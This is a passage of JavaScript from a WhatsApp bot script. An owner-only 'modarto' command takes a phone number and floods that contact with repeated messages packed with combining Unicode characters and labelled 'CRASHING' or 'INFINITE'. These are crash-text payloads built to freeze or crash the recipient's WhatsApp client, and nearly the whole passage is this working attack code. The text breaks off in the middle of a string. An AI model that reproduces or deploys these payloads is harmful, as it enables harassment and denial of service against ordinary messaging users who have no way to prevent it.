            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ INFINITE"},{quoted:asukonyol11})
            break
case 'modarto' : {
                    if (!isCreator) return
                    if (!text) throw `Nomernya mana?`
                    a = await hisoka.sendMessage(`${text}@s.whatsapp.net`, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 